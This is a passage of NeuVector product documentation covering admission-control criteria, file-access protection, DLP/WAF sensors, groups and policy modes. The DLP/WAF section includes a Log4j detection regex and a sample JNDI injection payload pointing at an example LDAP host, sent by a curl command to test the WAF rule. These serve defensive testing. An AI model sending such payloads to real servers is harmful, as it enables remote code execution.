useful for automated 'clean-up' of the discovered (and auto-created rules for) groups which are no longer in use, especially high-churn development environments. See Policy -&gt; Groups for the list of groups in NeuVector. Removing unused Groups will clean up the Groups list and all associated rules for those groups.  The X-FORWARDED-FOR enables/disables use of these headers in enforcing NeuVector network rules. This is useful to retain the original source IP of an ingress connection so it can be used for network rules enforcement. Enable means the source IP will be retained. See below for a detailed explanation.  Multiple webhooks can be configured to be used in Response Rules for customized notifications. Webhook format choices include Slack, JSON, and key-value pairs.  A Registry Proxy can be configured if your registry scanning connection between the controller and the registry must go through a proxy.  Configure SIEM integration through SYSLOG, including types of events, port etc. You can also choose to send events to the controller pod logs instead of or in addition to syslog. Note that these events will only be sent to the lead controller pod's log (not all controller pod logs in a multi-controller deployment).  An integration with IBM Security Advisor and QRadar can be established.  Import/Export the Security Policy file. You can configure SSO for SAML and LDAP/AD here as well. See the Enterprise Integration section for configuration details. Important! Be careful when importing the configuration file. Importing will overwrite the existing settings. If you import a ‘policy only’ file, the Groups and Rules of the Policy will be overwritten. If you import a file with ‘all’ settings, then the Policy, Users, and Configurations will be overwritten. Note that the original ‘admin’ user’s password of your current Controller will also be overwritten with the original admin’s password in the imported file.  The Usage Report and Collect Log exports may be requested by your NeuVector support team.  X-FORWARDED-FOR Behavior Details​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;   Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. This product can recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  A switch is available to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.  Settings -&gt; LDAP/AD, SAML, and OpenID Connect​  NeuVector supports integration with LDAP/AD, SAML, and OpenID Connect for SSO and user group mapping. See the Enterprise Integration section for configuration details.  Multiple Cluster Management​  You can manage multiple NeuVector clusters (e.g. multiple Kubernetes clusters running NeuVector on different clouds or on premise) by selecting a Master cluster, and joining remote clusters to them. Each remote cluster can also be individually managed. Security rules can be propagated to multiple clusters through use of Federated Policy settings.  My Profile​  You can increase the browser timeout setting, change your password and do other administrative profile edits.  Icon Descriptions in Legend &gt; Network Activity​  You can toggle the Legend on/off in the tools box of the Network Activity map.  Here is what the icons mean:  External network​  This is any network outside the NeuVector cluster. This could include internet public access or other internal networks.

The following is an example of an admission control configuration that requires a deployment's image be signed by an appropriate key or identity.  First, configure a root of trust. This can either be a public or private root of trust, depending on the Sigstore deployment used to generate signatures. If you have deployed your own instances of Sigstore's services, select the private root of trust option.  A public root of trust does not need any additional configuration outside of giving it an easily referenced name.    A private root of trust requires the the keys and/or certificates from your privately deployed instances of Sigstore's services.    Next, for a given root of trust, configure each of the verifiers that you would like to use during admission control. There are two types of verifiers: keypair and keyless. A keypair verifier would be used when trying to verify an image signed by a user-defined private key. A keyless verifier would be used when verifying a signature generated by Sigstore's keyless pattern. More information about the Sigstore signing methods can be seen here.  To configure a keypair verifier, provide a name, and a public key corresponding to a target private key.    To configure a keyless verifier, provide the OIDC issuer and identity used during signing.    Note that after root-of-trust and verifier configuration, an image must be scanned in order to determine which verifiers the given image's signatures satisfy.  The configured verifiers that an image satisfies can be viewed in the upper right section of a given image's scan results in Assets-&gt;Registries. If an image is not signed by a verifier, it will not appear in its scan results.    To reference a particular root of trust and verifier in an admission control rule, join the two names with a forward slash like so: my-root-of-trust/my-verifier.

The policy decision NeuVector makes will be passed back to cluster apiserver for enforcement.  This feature is supported in Kubernetes 1.9+ and Openshift 3.9+. Before using the Admission Control function in NeuVector, while it's possible to setup admission control from --admission-control argument passed to the cluster apiserver, it's recommended to use dynamic admission control.

These include CVE High Count, CVE Names, image labels, imageScanned, namespace, user, runAsRoot, etc. There are two possible sources of criteria evaluation, Image Scans and Deployment Yaml file scans. If a criterion requires an image scan, the scan results from Registry Scanning will be used. If the image was not scanned, the admission control rule will not be applied. If a criterion requires scanning of the deployment yaml, it will be evaluated from the Kubernetes deployment. Some criteria will use the results from either an image scan OR a deployment yaml scan.  CVE score is an example of a criterion requiring an image scan.Environment variables with secrets is an example of a criterion using the deployment yaml scan.Labels and Environment variables are examples of criteria which will use BOTH image and deployment yaml scans results (logical OR) to determine matches.    After the criterion is selected, the possible Operators will be displayed. Click the ‘+’ button to add each criterion.  Using Multiple Criteria in a Single RuleThe matching logic for multiple criteria in one admission control rule is:  For different criteria types within a single rule, apply 'and'For multiple criteria of same type (e.g. multiple namespaces, registries, images), Apply 'and' for all negative matches(&quot;not contains any&quot;, &quot;is not one of&quot;) until the first positive match;After the first positive match, apply 'or'  Example with Matching a Pod Label​  apiVersion: apps/v1 kind: Deployment metadata: name: iperfserver namespace: neuvector-1 spec: replicas: 1 template: metadata: labels: app: iperfserver   The rule to match would be:    Example with Matching Environment Variables with Secrets​  apiVersion: apps/v1 kind: Deployment metadata: name: iperfserver namespace: neuvector-1 labels: name: iperfserver spec: selector: matchLabels: name: iperfserver replicas: 1 template: metadata: labels: name: iperfserver spec: containers: - name: iperfserver image: nvlab/iperf env: - name: env1 value: AIDAJQABLZS4A3QDU576 - name: env2 valueFrom: fieldRef: fieldPath: status.podIP - name: env5 value: AIDAJQABLZS4A3QDU57E command: - iperf - -s - -p - &quot;6068&quot; nodeSelector: nvallinone: &quot;true&quot; restartPolicy: Always   The Matching rule would be:  Criteria Related to Scan Results​  The following criteria are related to the results in NeuVector Assets &gt; Registry scan page:  Image, imageScanned, cveHighCount, cveMediumCount, Image compliance violations, cveNames and others.  Before NeuVector performs the match against the Admission Control rules, NeuVector retrieves the image information (For example, 10.1.127.3:5000/neuvector/toolbox/iperf:latest) from the cluster apiserver (Please refer to Request from apiserver section below). The image is composed by registry server (https://10.1.127.3:5000), repository (neuvector/toolbox/iperf) and tag (latest).  NeuVector uses this information to match the results in NeuVector Assets -&gt; Registry scan page and collects the corresponding information such as cve name, cve high or medium count etc. Image compliance violations are considered any image which has secrets or setuid/setgid violations. If users are using the image from docker registry to create a cluster resource, normally the registry server information is empty or docker.io and currently NeuVector is using the following hard-coded registry servers to match the registry scan result instead of empty or docker.io string. Of course, if there are more other than the following supported docker registry servers defined in the registry scan page, NeuVector is unable to get the registry scan results successfully.  If users are using the built-in image such as alpine or ubuntu from the docker registry, there is a hidden organization name called library. When you look at the results for docker build-in image in NeuVector Assets &gt; Registry scan page, the repository name will be library/alpine or library/ubuntu. Currently NeuVector assumes there is only one hidden library organization name in docker registry. If there is more than one, NeuVector is unable to get the registry scan results successfully as well. The above limitation could also apply on other type of docker registry servers if any.  Creating Custom Criteria Rules​  Users can create a customized criterion to be used to allow or block deployments based on common objects found in the image yaml (scanned upon deployment). Select the object to be used, for example imagePullSecrets and the matching value, for example exists. It is also recommended to use additional criteria to further target the rule, such as namespace, PSP/PSA, CVE conditions etc.    Criteria Explanations​  Criteria with a disk icon require that the image be scanned (see registry scanning), and criteria with a file icon will scan the deployment yaml. If both icons are listed, then matching will be for either (OR). If a criterion requires an image scan, but the image is NOT scanned, that part of the rule will be ignored (ie rule is bypassed, or if deployment yaml is also listed, then only the deployment yaml will be used to match). To prevent non-scanned images from bypassing rules, see the Image Scanned criterion below.   Add customized criterion. Select the object from the drop down. All custom criteria support exists and does not exist operators. For ones that allow values, additional operators and the value can be entered. Values can be static, separated by comma’s, and include wildcards. Allow Privilege Escalation. If the container allows privilege escalations, it can be blocked by setting Deny as the action. Count of High Severity CVE. This takes the results of an image (registry) scan and matches on the number of High severity (CVSS scores of 7 or higher). Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. Count of High Severity CVE with fix. This takes the results of an image (registry) scan and matches on High severity (CVSS scores of 7 or higher), AND if there is a fix available for the CVE. Select this if only planning to block deployments of high CVEs if a fix should have been applied. Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. Count of Medium Severity CVE. This takes the results of an image (registry) scan and matches on the number of Medium severity (CVSS scores of between 4 and 6). Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. CVE names. This matches on specific CVE names (e.g. CVE-2023-23914, 2023-23914, 23914, or unique text) where multiple are separated by comma’s. CVE score. Configure both the minimum score as well as the number of CVEs matching or exceeding the minimum CVSS score. Environment variables with secrets. If the deployment yaml or image scan result contains (or does not contain) any environment variables with secrets. See the criteria for secrets matching below. Environment variables. Use this to require or exclude certain environment variables in the deployment yaml or image scan. Image. Matching on specific image names, typically combined with other criteria for the rule. Image compliance violations. Matches if the image (registry) scan results in any compliance violations. See compliance for details on compliance checks. Image without OS information. Matches if the image (registry) scan results in the inability to retrieve OS information. Image registry. Matches on specific image registry names. Typically used to restrict deployments from certain registries or require deployments only from certain approved registries. Often used with other criteria such as namespaces. Image scanned. Require that an image be scanned. Often used to make sure all images are scanned to ensure that scan based criteria such as high CVEs can be applied to deployments. Image signed. Require that an image be signed through the integration of Sigstore/Cosign. This criteria simply checks whether there is any verifier in the scan result.Image Sigstore Verifiers. Require that an image be signed by a specific Sigstore root-of-trust name, as configured in Assets -&gt; Sigstore Verifiers. Checks whether the verifiers in the scan result match the verifiers in the rule configuration.Labels. Require that one or more labels be present in the deployment yaml or image scan results. Modules. Requires or excludes certain modules (packages, libraries) from being present in the image as the result of the image (registry) scan. Mount volumes. Typically used to prevent certain volumes from being mounted. Namespace. Allow or restrict deployments for certain namespace(s). Used independently but often combined with other criteria to limit the rule matching to namespace. PSP Best Practice. Equivalent rules for PSP (note: PSP is completely removed from kubernetes 1.25+, however this NeuVector equivalent may still used in 1.25+). Includes Run as privileged, Run as root, Share host's PID namespaces, Share host's IPC namespaces, Share host's Network, Allow Privilege Escalation. Resource Limit Configuration (RLC). Requires resource limits to be configured for CPU Limit/Request, Memory Limit/Request, and can require operator to be &gt; or &lt;= a configured resource value. Run as privileged. Typically used to limit or block deployments of privileged containers. Run as root. Typically used to limit or block deployments of containers run as root.. Service Account Bound High Risk Role. Can match on multiple criteria which could respresent a high risk service account role, including listing secrets, performing any operations on workloads, modification of RBAC resources, creation of workload resources, and allowing exec into a container. Share host’s IPC namespaces. Matches on IPC namespaces. Share host’s Network. Allow or disallow deployments to share the host’s network. Share host’s PID namespaces . Matches on PID namespaces. User. Allow or disallow defined users bound by kubernetes at run-time, visible in the userInfo field. Note: The yaml (upload) auditing function will not be able to check this because it is bound at run-time. User groups. Allow or disallow defined user groups bound by kubernetes at run-time, visible in the userInfo field. Note: The yaml (upload) auditing function will not be able to check this because it is bound at run-time. Violates PSA policy. Matches if the deployment violates either a Restricted or Baseline PSA Pod Security Standard (equivalent to PSA definitions in kubernetes 1.25+)   Secrets detection​  Detection of secrets, for example in environment variables is matched used the following regex:  Rule{Description: &quot;Password.in.YML&quot;, Expression: `(?i)(password|passwd|api_token)\\S{0,32}\\s*:\\s*(?-i)([0-9a-zA-Z\\/+]{16,40}\\b)`, ExprFName: `.*\\.ya?ml`, Tags: []string{share.SecretProgram, &quot;yaml&quot;, &quot;yml&quot;}, Suggestion: msgReferVender},   A list of types of secrets detected can be found here   ","version":"Next 🚧","tagName":"h3"},{"title":"Admission Control Modes​","type":1,"pageTitle":"Admission Controls","url":"/next/policy/admission#admission-control-modes","content":" There are two modes NeuVector supports - Monitor and Protect.

Review Admission Control Configurations​  First, check your Kubernetes or OpenShift version. Admission control is supported in Kubernetes 1.9+ and OpenShift 3.9+. For OpenShift, make sure you have edited the master-config.yaml to add the MutatingAdmissionWebhook configuration and restarted the master api-servers.  Check the Clusterrole  kubectl get clusterrole neuvector-binding-admission -o json   Make sure the verbs include:   &quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;delete&quot;   Then check:  kubectl get clusterrole neuvector-binding-app -o json   Make sure the verbs include:   &quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;update&quot;   If the above verbs are not listed, the Test button will fail.

One is Zero-drift, where allowed process and file activity are automatically determined based on the container image, and second is a behavioral learning based. Each can be customized (rules added manually) if desired.  NeuVector has built-in detection of suspicious file system activity. Sensitive files in containers normally do not change at run-time. By modifying the content of the sensitive files, an attacker can gain unauthorized privileges, such as in the Dirty-Cow linux kernel attack, or damage the system’s integrity, for example by manipulating the /etc/hosts file. Most containers don't run in read-only mode. Any suspicious activity in containers, hosts, or the NeuVector Enforcer container itself will be detected and logged into Notifications -&gt; Security Events.  Zero-drift File Protection​  This is the default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require file activity to be added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.  note The process/file rules listed for each group are always applied, even when zero-drift is enabled. This offers a way to add allow/deny exceptions to the base zero-drift protections. Keep in mind that if a group starts in Discover mode, process/file rules can be automatically added to the list, and should be reviewed and edited before moving to Monitor/Protect modes.  The ability to enable/disable zero-drift mode is in the console in Policy -&gt; Groups. Multiple groups can be selected to toggle this setting for all selected groups.  Basic File Protections​  If a package installation is detected, an automatic re-scan of the container or host will be triggered to detect any vulnerabilities, IF auto-scan has been enabled in Security Risks -&gt; Vulnerabilities.  In addition to monitoring predefined files/directories, users can add custom files/directories to be monitored, and block such files/directories from being modified.  important NeuVector alerts, and does not block modifications to predefined files/directories or in system containers such as Kubernetes ones. Blocking is only an option for user configured custom files/directories for non-system containers. This is so that regular updates of system folder or sensitive configurations are not blocked unintentionally, resulting in erratic system behavior.  The following files and directories are monitored by default:  Executable filesSensitive setuid/setgid filesSystem libraries, libc, pthread, ...Package installation, Debian/Ubuntu, RedHat/CentOS, AlpineSensitive system files, /etc/passwd, /etc/hosts, /etc/resolv.conf …Running processes' executable files  The following activities are monitored:  Files, directories, symlinks (hard link and soft link)created, deleted, modified (content change) and moved  Below is a list of the file system monitoring and what is monitored (container, host/node, and/or NeuVector enforcer container itself):  /bin, /usr/bin, /usr/sbin, /usr/local/bin - container, enforcerFiles of setuid and setgid attribute - container, host, enforcerLibraries: libc, pthread, ld-linux.* - container, host, enforcerPackage installation: dpkg, rpm, apk - container, host, enforcer/etc/hosts, /etc/passwd, /etc/resolv.conf - container, host, enforcerBinaries of the running processes - container  Behavioral-learning based Allowed Applications in Discover Mode​  When in Discover mode, NeuVector can learn and whitelist applications ONLY for specified directories or files. To enable learning, a custom rule must be created and the Action must be set to Block, as described below.  Creating Custom File/Directory Monitoring Rules​  Custom file access rules can be created for both custom user-defined Groups as well as auto-learned Groups.  Users can add new entries for file/directory rules.  Filter: Configure the file/folder to be protected (wildcards are supported)Set the recursive flag (if all files in the subdirectories are to be protected)Select the action, Monitor or Block (see Actions below)Enter allowed applications (see Note1 below)    Actions:  Monitor file changes. Generate alerts (Notifications) for any changesBlock unauthorized access. Service in Discover mode: the file access behavior is learned (the processes/applications that access the protected file) and added to the Allowed Applications.Service in Monitor mode: unexpected file behavior is alerted.Service in Protect mode: unexpected access (read, modify) is blocked. New file creation in protected folders will be blocked as well.  note If the rule is set to Block, and the service is in Discover mode, NeuVector will learn the applications accessing the file and add these to the Allowed Applications for the rule.  note Container platforms running the AUFS storage driver will not support the deny (block) action in Protect mode for creating/modifying files due to the limitations of the driver. The behavior will be the same a Monitor mode, alerting upon suspicious activity.  File access rule order precedence​  A container can inherit file access rule from multiple custom groups and user created file access rule on auto learned group.  File access rules are prioritized in the order below if the file name conflicts with predefined access rules of auto learned group and rules inheritance of multiple groups.  File access rule with block access (highest order)File access rule with recursive enabledFile access rule with recursive disableUser created file access rule other than predefined file access rules  Examples​  Showing file access rule to protect /etc/hostname file of node-pod service and allow vi application to modify the file.    Showing file access rule to protect files under /var/opt/ directory recursively for modification as well reading. The Allowed Application python can have read and modify access to these files.    Showing access rule that protects file /etc/passwd, which is one of the files covered predefined access rule in order to modify the file access action, for modification as well reading. This custom rule changes the default action of the predefined file access rule. The application Nano can have 'read and modify' access to these files. Must also add the Nano application (process) as an 'allow' rule in the process profile rule for this service to run Nano application inside the service (if it wasn't already whitelisted there), otherwise the process will be blocked by NeuVector.    Showing that the application python was learned accessing file under /var/opt directory when service mode of node-pod was in Discover. This occurs only when the rule is set to Block and the service is in Discover mode.    Showing predefined file access rules for the service node-pod.demo-nvqa. This can be viewed for this service by clicking the info icon “show predefined filters” in the right corner of the file access rule tab.    Showing a sample security event in Notifications -&gt; Security Events, alerted as File access denial when modification of the file /etc/hostname by the application python was denied due to a custom file access rule with block action.    Other Responses​  If other special mitigations, responses, or alerts are desired for File System Violations, a Response Rule can be created.

NeuVector uses a regular expression (regex) based engine to perform packet filtering functions. Extreme care should be taken when applying sensors to container traffic, as the filtering function incurs additional system overhead and can impact performance of the host.  DLP and WAF filtering are applied differently depending on the group(s) to which they are applied. In general, WAF filtering is applied to inbound and outbound connections except for internal traffic where only inbound filtering is applied. DLP filtering applies to inbound and outbound connections from a 'security domain', but not any internal connections within a security domain. See the detailed descriptions below.  Configuring DLP or WAF is a two step process:  Define and test the sensor(s), which is the set of regular expressions used to match the header, URL, or entire packet.Apply the desired sensor to a Group, in the Policy -&gt; Groups screen.  WAF Sensors​  WAF sensors represent inspection of network traffic to/from a pod/container. These sensors can be applied to any applicable group, even custom groups (e.g. namespace groups). Incoming traffic to ALL containers within the group will be inspected for WAF rule detection. In addition, any outbound (egress) connections external to the cluster will be inspected.  This means that, while this feature is named WAF, it is useful and applicable to any network traffic, not only web application traffic, and therefore provides broader protections than simple WAFs. For example, API security can be enforced on outbound connections to an external api service, allowing only GET requests and blocking POSTs.  Also note that, while similar to DLP, the inspection is for incoming traffic to EVERY pod/container within the group, while DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers).    DLP Sensors​  DLP Sensors are the patterns that are used to inspect traffic. Built in sensors such as credit card and U.S. social security have predefined regular expressions. You can add custom sensors by defining regex patterns to be used in that sensor. Note that, while similar to WAF, DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers). WAF inspection is for incoming traffic only to EVERY pod/container within the group.    Configuring DLP and WAF sensors​  The configuration of DLP and WAF sensors is similar. Create a sensor Name and any comment, then select the sensor to Add or Edit the rules for that sensor. Key fields include:  Have/Not Have. Determines if the match requires the pattern to be found (Have) in order to take the action (e.g. Deny), or only if the pattern does not exist (Not Have) should the action be taken. It is recommended that the &quot;Not Have&quot; operator be combined in the rule with a pattern using the &quot;Have&quot; operator because a single pattern with &quot;Not Have&quot; operator will not be effective.Pattern. This is the regular expression used to determine a match. You can test your regex against sample data to ensure correct Have/Not Have results.Context. Where to look for the pattern match. Choose packet for the broadest inspection of the entire network connection, or narrow the inspection to the URL, header, or body only.    Each DLP/WAF rule supports multiple patterns (max 16 patterns are allowed per rule). Multiple patterns as well as setting the rule context can also help reduce false positives.  Example of a DLP rule with a Have/Not Have pattern: Have:  \\b3[47]\\d{2}([ -]?)(?!(\\d)\\2{5}|123456|234567|345678)\\d{6}\\1(?!(\\d)\\3{4}|12345|56789)\\d{5}\\b   This produces a false positive match for &quot;istio_agent_go_gc_duration_seconds_sum 22.378386247999998&quot;:  docker exec -ti httpclient sh / # curl -d &quot;{\\&quot;context\\&quot;: \\&quot;istio_agent_go_gc_duration_seconds_sum 22.378386247999998\\&quot;}&quot; 172.17.0.5:8080/ Hello, world!   Adding a Not Have pattern removes the false positive:  istio\\_(\\w){5}   Sensors must be applied to a Group to become effective.  Applying DLP/WAF Sensors to Container Groups​  To activate a DLP or WAF sensor, go to Policy -&gt; Groups to select the group desired. Enable DLP/WAF for the Group and add the sensor(s).  It is recommended that DLP sensors be applied to the boundary of a security zone, defined by a Group, to minimize the impact of DLP inspection. If needed, define a Custom Group that represents such a security zone. For example, if the Group selected is the reserved group 'containers', and DLP sensors added to the group, only traffic in or out of the cluster and not between all containers will be inspected. Or if it is a custom group defined as 'namespace=demo' then only traffic in or out of the namespace demo will be inspected, and not any inter-container traffic within the namespace.  It is recommended that WAF sensors be applied only to Groups where incoming (e.g. ingress) connections are expected, unless the sensor(s) apply to specific internal applications (expecting east-west traffic).    DLP/WAF Behavior Summary  DLP pattern matching does not occur for the traffic which is passing among workloads that belong to same DLP group.Any traffic passing in and out of a DLP group is scanned for pattern matches.Cluster ingress and egress traffic is scanned for patterns if the workload is allowed to make ingress/egress connections.Multiple patterns per DLP/WAF rule (max 16 patterns are allowed per rule).Multiple alerts are generated for a single packet if it matches multiple rules.For performance reasons, only the first 16 rules are alerted and matched even if the packet matches more than 16 rules.Alerts are aggregated and reported together if same rule matches and alerts multiple times within 2 seconds.PCRE is used for pattern matching.Hyper scan library is used for efficient, scalable and high-performance pattern matching.  DLP/WAF Actions in Discover, Monitor, Protect Modes​  When adding sensors to groups, the DLP/WAF action can be set to Alert or Deny, with the following behavior if there is a match:  Discover mode. The action will always be to alert, regardless of the setting Alert/Deny.Monitor mode. The action will always be to alert, regardless of the setting Alert/Deny.Protect mode. The action will be to alert if set to Alert, or block if set to Deny.  Log4j Detection WAF Pattern​  The WAF-like rule to detect the Log4j attempted exploit is below. Please note this should only be applied to Groups expecting ingress web connections.  \\$\\{((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[jJ](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[nN](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[dD](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[iI])((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\\:\\/\\/.*   Also note that there are ways that attackers could bypass detection by such rules.  Testing the Log4j WAF Detection​  In an attempted exploit, the attacker will construct an initial jndi: insertion and include it in the User-Agent HTTP Header:  User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}   Using curl to POST data to server(container) can help to test WAF rule:  curl -X POST -k -H &quot;X-Auth-Token: $_TOKEN_&quot; -H &quot;Content-Type: application/json&quot; -H &quot;User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}&quot; -d '$SOME_DATA' &quot;http://$SOME_IP_:$PORT&quot;   WAF Setup and Testing​  The downloadable file below provides an unsupported script for creating WAF sensors via CRD and running common WAF rule tests against those sensors.

It is also used to switch modes of Groups between Discover, Monitor, and Protect. Container Groups can have Process/File rules in a different mode than Network rules, as described here. Please see the following individual sections for explanations of Custom Compliance Checks, Network Rules, Process and File Access Rules and DLP/WAF detection. Note: Network rules can be viewed in the Groups menu for any group, but must be edited separately in the Network Rules menu.  NeuVector automatically creates Groups from your running applications. These groups start with the prefix 'nv.' You can also manually add them using a CRD or the REST API and can be created in any mode, Discover, Monitor, or Protect. Network and Response Rules require these Group definitions. For automatically created Groups ('learned' groups starting with 'nv'), NeuVector will learn the network and process rules and add them while in Discover mode. Custom Groups will not auto-learn and populate rules. Note: 'nv.' groups start with zero drift enabled by default for process/file protections.    It is convenient to see groups of containers and apply rules to each group. NeuVector creates a list of groups based on the container images. For example, all containers started from one Wordpress image will be in the same group. Rules are automatically created and applied to the group of containers.  The Groups screen also displays a 'Scorable' icon in the upper right, and a learned group can be selected and the Scorable checkbox enabled or disabled. This controls which containers are used to calculate the Security Risk Score in the Dashboard. See Improve Security Risk Score for more details.  The Groups screen is also where the CRD yaml file for 'security policy as code' can be imported and exported. Select one or more groups and click on the Export Group policy button to download the yaml file. See the CRD section for more details on how to use CRDs. Important: Each selected group AND any linked groups through network rules will be exported (i.e. the group and any other group it connects to through the whitelist network rules).  Auto Deletion of Unused Groups​  Learned groups (not reserved or custom groups) can be automatically deleted by NeuVector if there are no members (containers) in the group. The time period for this is configurable in Settings -&gt; Configuration.  Host Protection - the 'Nodes' Group​  NeuVector automatically creates a group called 'nodes' which represents each node (host) in the cluster. NeuVector provides automated basic monitoring of hosts for suspicious processes (such as port scans, reverse shells etc.) and privilege escalations. In addition, NeuVector will learn the process behavior of each node while it is in Discover mode to whitelist those processes, similar to how it is done with container processes. The 'local' (learned) process rule list is a combination of all processes from all nodes in the cluster while in Discover mode.  The nodes can then be put into the Monitor or Protect mode, where NeuVector will alert is any process starts while in Monitor mode, and block that process in Protect mode.    To enable host protection with process profile rules, select the 'nodes' group and review the learned processes on the node. Customize if needed by adding, deleting or editing process rules. Then switch the mode to Monitor or Protect.  note Network connection violations of rules shown in the Network Rules for Nodes are never blocked, even in Protect mode. Only process violations are blocked in Protect mode on nodes.  Custom Groups​  Groups can be manually added by entering the criteria for the group. Note: Custom created groups don't have a Protection mode. This is because they may contain containers from different underlying groups, each of which may be in a different mode, causing confusion about the behavior.  Groups can be created by:  Images  Select containers by their image names. Examples: image=wordpress, image@redis  Nodes  Select containers by nodes on which they are running. Examples: node=ip-12-34-56-78.us-west-2  Individual containers  Select containers by their instance names. Examples: container=nodejs_1, container@nodejs  Services  Select containers by their services. If a container is deployed by Docker Compose, its service tag value will be &quot;project_name:service_name&quot;; if a container is deployed by Docker swarm mode service, its service tag value will be the swarm service name.  Labels  Select containers by their labels. Examples: com.docker.compose.project=wordpress, location@us-west  Addresses  Create a group by DNS name or IP address ranges. Examples: address=www.google.com, address=10.1.0.1, address=10.1.0.0/24, address=10.1.0.1-10.1.0.25. DNS name can be any name resolvable. Address criteria do not accept the != operator. See below for special virtual host 'vh' address groups.  A group can be created with mixed criteria types, except the 'address' type, which cannot be used together with other criteria. Mixed criteria enforces an ‘AND’ operation between the criteria, for example label service_type=data AND image=mysql. Multiple entries for one or criteria are treated as OR, for example address=google.com OR address=yahoo.com. Note: To assist in analyzing ingress/egress connections, a list of ingress and egress IPs can be downloaded from the Dashboard -&gt; Ingress/Egress details section as an Exposure Report.  Partial matching is supported for image, node, container, service and label criteria. For example, image@redis, selects containers whose image name contains 'redis' substring; image^redis, selects containers whose image name starts with 'redis'.  It is not recommended to use address criteria to match internal IPs or subnets, especially those protected by enforcers, instead, using their meta data, such as image, service or labels, is recommended. The typical use cases for address group are to define policies between managed containers and external IP subnets, for example, services running on Internet or another data center. Address group does not have group members.  Wildcards '' can be used in criteria, for example 'address=.google.com'. For more flexible matching, use the tilde '' to indicate a regex match is desired. For example to match labels 'policypublic.*-ext1' for the label policy.  note Special characters used after an equals '=' in criteria may not match properly. For example the dot '.' In 'policy=public.' will not match properly, and regex match should be used instead, like 'policy~public.'  After saving a new group, NeuVector will display the members in that group. Rules can then be created using these groups.  Virtual Host ('vh') Based Network Policy​  Custom groups can support virtual host based address groups. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.

Container Groups can have Process/File rules in a different mode than Network rules, as described here.    note Custom created groups don't have a Protection mode. This is because they may contain containers from different underlying groups, each of which may be in a different mode, causing confusion about the behavior.  Discover​  By default, NeuVector starts in Discover mode. In this mode, NeuVector:  Discovers your container infrastructure, including containers, nodes, and hosts.Learns your applications and behaviors by observing conversations (network connections) between containers.Identifies separate services and applications running.Automatically builds a whitelist of Network Rules to protect normal application network behavior.Baselines the processes running in containers for each service and creates whitelist Process Profile Rules.  note To determine how long to run a service in Discover mode, run test traffic through the application and review all rules for completeness. Several hours should be sufficient, but some applications may require a few days to be fully exercised. When in doubt, switch to Monitor mode and check for violations, which can then be converted to whitelist rules before moving to Protect mode.  Monitor​  In Monitor mode NeuVector monitors conversations and detects run-time violations of your Security Policy. In this mode, no new rules are created by NeuVector, but rules can manually be added at any time.  When violations are detected, they are visible in the Network Activity map visually by a red line.

Remember that in Discover mode, NeuVector is building a Security Policy for allowed, normal container behavior. You can see these rules in the Policy -&gt; Groups tab or in detail in the Policy -&gt; Network Rules menu.  When you switch from Discover to Monitor mode, NeuVector will flag all violations of normal behavior not explicitly allowed. Because NeuVector enforces policy based on applications and groups with similar attributes, it’s typically not necessary to add or edit rules when scaling up or scaling down containers.  Please ensure that, before introducing new updates that result in new types of connections between containers, you switch the affected Service(s) to Discover mode to learn these new behaviors. Alternatively, you can manually add new rules while in any mode, or edit the CRD used to create the rules to add new behaviors.  New Service Mode​  If new services are discovered by NeuVector, for example a previously unknown container starts running, it can be set to a default mode. In Discover mode, NeuVector will start to learn its behavior and build Rules. In Monitor, a violation will be generated when connections to the new service are detected. In Protect, all connections to the new service will be blocked unless the rules have been created prior.    Network Service Policy Mode​  There is a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.  Automated Promotion of Group Modes​  Promotes a 